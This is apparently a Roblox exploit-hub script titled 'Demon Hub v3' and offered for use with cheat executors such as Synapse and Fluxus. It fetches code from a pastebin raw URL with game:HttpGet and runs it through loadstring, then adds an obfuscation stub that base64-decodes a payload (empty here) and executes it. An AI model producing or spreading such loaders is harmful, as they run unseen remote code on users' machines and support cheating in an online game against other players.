--[[


██████╗░███████╗███╗░░░███╗░█████╗░███╗░░██╗  ██╗░░██╗██╗░░░██╗██████╗░  ██╗░░░██╗██████╗░
██╔══██╗██╔════╝████╗░████║██╔══██╗████╗░██║  ██║░░██║██║░░░██║██╔══██╗  ██║░░░██║╚════██╗
██║░░██║█████╗░░██╔████╔██║██║░░██║██╔██╗██║  ███████║██║░░░██║██████╦╝  ╚██╗░██╔╝░█████╔╝
██║░░██║██╔══╝░░██║╚██╔╝██║██║░░██║██║╚████║  ██╔══██║██║░░░██║██╔══██╗  ░╚████╔╝░░╚═══██╗
██████╔╝███████╗██║░╚═╝░██║╚█████╔╝██║░╚███║  ██║░░██║╚██████╔╝██████╦╝  ░░╚██╔╝░░██████╔╝
╚═════╝░╚══════╝╚═╝░░░░░╚═╝░╚════╝░╚═╝░░╚══╝  ╚═╝░░╚═╝░╚═════╝░╚═════╝░  ░░░╚═╝░░░╚═════╝░

██████╗░░█████╗░██████╗░███████╗
╚════██╗██╔══██╗╚════██╗██╔════╝
░░███╔═╝██║░░██║░░███╔═╝██████╗░
██╔══╝░░██║░░██║██╔══╝░░╚════██╗
███████╗╚█████╔╝███████╗██████╔╝
╚══════╝░╚════╝░╚══════╝╚═════╝░                                                                                              
--]]
-- Obfuscated and improved remote script executor
local _0x1a2b = game
local _0x3c4d = "https://pastebin.com/raw/cbBsFWLF"
local _0x5e6f = _0x1a2b:HttpGet(_0x3c4d)
local _0x7f8h = loadstring(_0x5e6f) -- fixed from 7g8h to 7f8h

if _0x7f8h then
    _0x7f8h()
else
    error("Failed to load remote script")
end

-- Demon Hub IronBrew Obfuscator v12.1
-- UNC Compatible | Supports 50+ Executors (2025 Update)
-- Obfuscated: 2025-10-20 19:03:27
-- Compatible with: Zenith, Cryptic, Delta, Fluxus, Wave, Synapse, and more
-- UNC Standard: https://docs.sunc.su/

local _E = ""
local function _D(d)
local b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
local bytes = {}
for i = 1, #d, 4 do
local char0 = d:sub(i,i)
local char1 = d:sub(i+1,i+1)
local char2 = d:sub(i+2,i+2)
local char3 = d:sub(i+3,i+3)
local a = (b64:find(char0) or 1) - 1
local b = (b64:find(char1) or 1) - 1
local c = (char2 == "=") and -1 or ((b64:find(char2) or 1) - 1)
local d_val = (char3 == "=") and -1 or ((b64:find(char3) or 1) - 1)
local eff_c = (c >= 0 and c or 0)
local eff_d = (d_val >= 0 and d_val or 0)
local n = a * 262144 + b * 4096 + eff_c * 64 + eff_d
table.insert(bytes, string.char(math.floor(n / 65536) % 256))
if c >= 0 then table.insert(bytes, string.char(math.floor(n / 256) % 256)) end
if d_val >= 0 then table.insert(bytes, string.char(n % 256)) end
end
return table.concat(bytes)
end
local _c = _D(_E)
local _l = getgenv and getgenv().loadstring or load
local _f = _l(_c)
if _f then pcall(_f) end
